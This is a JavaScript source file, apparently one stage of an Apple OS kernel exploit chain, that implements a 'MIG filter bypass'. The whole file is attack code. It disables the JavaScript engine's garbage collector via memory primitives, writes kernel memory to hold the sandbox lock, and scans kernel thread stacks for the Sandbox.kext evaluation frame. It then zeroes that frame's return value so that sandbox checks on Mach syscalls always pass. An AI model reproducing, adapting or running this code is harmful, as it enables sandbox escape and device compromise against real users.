import Native from "libs/Chain/Native";
import Chain from "libs/Chain/Chain";
import Task from "libs/TaskRop/Task";
import Thread from "libs/TaskRop/Thread";
import TaskRop from "libs/TaskRop/TaskRop";
import Logger from "libs/JSUtils/Logger";
import Utils from "libs/JSUtils/Utils";
import DriverNewThread from "libs/Driver/DriverNewThread";

const TAG = "MIG_FILTER_BYPASS";

const RUN_FLAG_STOP = 0;
const RUN_FLAG_RUN = 1;
const RUN_FLAG_PAUSE = 2;

function disarm_gc() {

	let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
	let heap = vm + 0xc0n;
	let m_threadGroup = uread64(heap + 0x198n);
	let threads = uread64(m_threadGroup);
	uwrite64(threads + 0x20n, 0x0n);
	// LOG("[+] gc disarmed");
}

function kstrip(addr) {
	return addr | 0xffffff8000000000n;
}

function lockSandboxLock() {
	// Find "_duplicate_lock" address, which is a "lck_rw_t"
	const lockAddr = Chain.getKernelBase() + migLock;
	const sbxMessageAddr = Chain.getKernelBase() + migSbxMsg;

	//console.log(TAG, "kernelSlide: " + Utils.hex(kernelSlide));
	//console.log(TAG, "lockAddr: " + Utils.hex(lockAddr));
	//console.log(TAG, "sbxMessageAddr: " + Utils.hex(sbxMessageAddr));

	let lockBuff = Chain.readBuff(lockAddr, 16);
	let lockBuff32 = new Uint32Array(lockBuff);
	//for (let i=0, j=0; i<16; i+=4, j++)
	//	console.log(TAG, `${Utils.hex(i)}: ${Utils.hex(lockBuff32[j]).padStart(8, '0')}`);

	let lockData = lockBuff32[2];
	lockData |= 0x410000;	// interlock + can_sleep
	Chain.write32(lockAddr + 0x8n, lockData);

	// Do we need to clear this addr while locking too? Or maybe just when we unlock is enough?
	Chain.write64(sbxMessageAddr, 0n);
}

function unlockSandboxLock() {
	const lockAddr = Chain.getKernelBase() + migLock;
	const sbxMessageAddr = Chain.getKernelBase() + migSbxMsg;

	
	// clear the sbx message buffer (pointer) used to check for duplicate messages.
	// This should solve an issue with sfree() if we unlock and lock sandbox quick enough.
	Chain.write64(sbxMessageAddr, 0n);

	let lockBuff = Chain.readBuff(lockAddr, 16);
	let lockBuff32 = new Uint32Array(lockBuff);

	let lockData = lockBuff32[2];
	lockData &= ~0x10000;	// interlock
	Chain.write32(lockAddr + 0x8n, lockData);
}

function dumpKMem(addr, size) {
	Chain.read(addr, Native.mem, size);
	let buff = Native.read(Native.mem, size);
	let buff64 = new BigUint64Array(buff);
	for (let i=0, j=0; i<size; i+=8, j++) {
		let bits = buff64[j] & 0xfffn;
		if (bits === 0x4a4n)
			console.log(TAG, `[${Utils.hex(addr + BigInt(i))}] ${Utils.hex(i)}: ${Utils.hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);
		else
			console.log(TAG, `[${Utils.hex(addr + BigInt(i))}] ${Utils.hex(i)}: ${Utils.hex(buff64[j]).padStart(16, '0')}`);
	}
}

function findReturnValueOffs(addr) {
	// Read from thread kstack, page aligned
	const READ_SIZE = 0x1000;
	//Chain.read(addr, Native.mem, READ_SIZE);
	let pageAddr = Task.trunc_page(addr);
	let startAddr = pageAddr + 0x3000n;
	let buff = Chain.readBuff(startAddr, READ_SIZE);
	if (!buff)
		return false;
	let buff64 = new BigUint64Array(buff);
	let expectedLR = Chain.getKernelBase() + migKernelStackLR;

	// Look for 0xxxxxxxxxxxxxx4a4 value, which should be the LSB of LR pointing to Sandbox.kext inside
	// "_sb_evaluate_internal()", so meaning we found the function stack we need (_sb_eval).
	for (let i=0, j=0; i<READ_SIZE; i+=8, j++) {
		let val = kstrip(buff64[j]);
		if (val === expectedLR) {
			//console.log(TAG, `Matching LR found at ${Utils.hex(startAddr + BigInt(i))}: ${Utils.hex(buff64[j])}`);

			// The return value of _eval() is stored in the stack at -40 bytes from LR.
			let offs = startAddr + BigInt(i - 40);
			return offs;
		}
	}
	return false;
}

function disableFilterOnThread(threadAddr) {
	//console.log(TAG, "Read kstack of thread: " + Utils.hex(threadAddr));
	let kstack = Thread.getStack(threadAddr);
	if (!kstack)
		return false;

	kstack = kstrip(kstack);
	let kernelSPOffset = BigInt(Utils.UINT64_SIZE * 12);
	let kernelSP = Chain.read64(kstack + kernelSPOffset);
	if (!kernelSP)
		return false;

	//console.log(TAG, "kstack:   " + Utils.hex(kstack));
	//console.log(TAG, "kernelSP: " + Utils.hex(kernelSP));

	//dumpKMem(kstack, 0x70);
	//dumpKMem(kernelSP, 0x1000);

	//console.log(TAG, "Possible MIG syscall with thread: " + Utils.hex(threadAddr));

	let offs = findReturnValueOffs(kernelSP);
	if (!offs) {
		//console.log(TAG, "Unable to find offset");
		return false;
	}

	//console.log(TAG, "Offs found at: " + Utils.hex(offs));

	Chain.write64(offs, 0n);

	console.log(TAG, "MIG syscall intercepted for thread: " + Utils.hex(threadAddr));

	return true;
}

function waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, timeout=5000) {
	//console.log(TAG, "Wait for MIG syscall...");
	let startTimestamp = Date.now();

	while (true) {
		let runBypassFlag = Native.read32(runBypassFlagPtr);
		if (!runBypassFlag)
			return RUN_FLAG_STOP;
		if (runBypassFlag == RUN_FLAG_PAUSE)
			return RUN_FLAG_PAUSE;

		if (timeout && (Date.now() - startTimestamp >= timeout)) {
			console.log(TAG, "Timeout waiting for a syscall");
			break;
		}

		let filterTriggered = false;
		let monitorThread1 = monitorThread1Ptr ? Native.read64(monitorThread1Ptr) : false;
		let monitorThread2 = monitorThread2Ptr ? Native.read64(monitorThread2Ptr) : false;

		if (monitorThread1 && monitorThread2) {
			//console.log(TAG, "check monitored threads");
			filterTriggered |= disableFilterOnThread(monitorThread1);
			filterTriggered |= disableFilterOnThread(monitorThread2);
		}
		else {
			//console.log(TAG, "Waiting for monitored threads...");
		}
		
		if (filterTriggered)
			break;

		//console.log(TAG, "No MIG syscall detected");

		Native.callSymbol("usleep", 50000);
	}
	//console.log(TAG, "MIG syscall intercepted!");
	return RUN_FLAG_RUN;
}

function startFilterBypass(runBypassFlagPtr) {
	let run = RUN_FLAG_PAUSE;

	let selfTaskAddr = Task.gSelfTask.addr;

	while (run) {
		if (run == RUN_FLAG_PAUSE) {
			console.log(TAG, "Pausing filter bypass");
			while (true) {
				run = Native.read32(runBypassFlagPtr);
				if (run != RUN_FLAG_PAUSE) {
					if (run == RUN_FLAG_RUN)
						console.log(TAG, "Resuming filter bypass");
					break;
				}
				Native.callSymbol("usleep", 100000);
			}
		}

		//console.log(TAG, "Locking sandbox...");
		lockSandboxLock();
		//console.log(TAG, "Sandbox locked");

		run = waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, 5000);

		unlockSandboxLock();
		//console.log(TAG, "Sandbox unlocked");

		if (run)
			Native.callSymbol("sched_yield");
	}
}

disarm_gc();

// Register log function
//globalThis.LOG_POST_TO_FILE = false;
console.log = Logger.log;

console.log(TAG, "Thread initialized!");

let kernelControlPtr = thread_arg;
let kernelRWPtr = thread_arg + 0x8n;
let kernelBasePtr = thread_arg + 0x10n;
let mainThreadAddrPtr = thread_arg + 0x18n;
let runBypassFlagPtr = thread_arg + 0x20n;
let isRunningPtr = thread_arg + 0x28n;
let mutexPtr = thread_arg + 0x30n;
let migLockPtr = thread_arg + 0x38n;
let migSbxMsgPtr = thread_arg + 0x40n;
let migKernelStackLRPtr = thread_arg + 0x48n;
let monitorThread1Ptr = thread_arg + 0x50n;
let monitorThread2Ptr = thread_arg + 0x58n;

let kernelControl = uread64(kernelControlPtr);
let kernelRW = uread64(kernelRWPtr);
let kernelBase = uread64(kernelBasePtr);
let mainThreadAddr = uread64(mainThreadAddrPtr);
runBypassFlagPtr = uread64(runBypassFlagPtr);
isRunningPtr = uread64(isRunningPtr);
let mutex = uread64(mutexPtr);
let migLock = uread64(migLockPtr);
let migSbxMsg = uread64(migSbxMsgPtr);
let migKernelStackLR = uread64(migKernelStackLRPtr);
monitorThread1Ptr = uread64(monitorThread1Ptr);
monitorThread2Ptr = uread64(monitorThread2Ptr);

console.log(TAG, "kernelControl:     " + kernelControl);
console.log(TAG, "kernelRW:          " + kernelRW);
console.log(TAG, "kernelBase:        " + Utils.hex(kernelBase));
console.log(TAG, "mainThreadAddr:    " + Utils.hex(mainThreadAddr));
console.log(TAG, "runBypassFlagPtr:  " + Utils.hex(runBypassFlagPtr));
console.log(TAG, "isRunningPtr:      " + Utils.hex(isRunningPtr));
console.log(TAG, "mutex:             " + Utils.hex(mutex));
console.log(TAG, "migLock:           " + Utils.hex(migLock));
console.log(TAG, "migSbxMsg:         " + Utils.hex(migSbxMsg));
console.log(TAG, "migKernelStackLR:  " + Utils.hex(migKernelStackLR));
console.log(TAG, "monitorThread1Ptr: " + Utils.hex(monitorThread1Ptr));
console.log(TAG, "monitorThread2Ptr: " + Utils.hex(monitorThread2Ptr));

try {
	let driver = new DriverNewThread(kernelControl, kernelRW, kernelBase);
	Chain.init(driver, mutex);
	Chain.testKRW();
	TaskRop.init();

	console.log(TAG, "Chain initialized");

	Native.write32(isRunningPtr, 1);

	startFilterBypass(runBypassFlagPtr);

	console.log(TAG, "Terminating bypass thread");
}
catch (error) {
	console.log(TAG, "Error: " + error);
	console.log(TAG, "" + error.stack);
}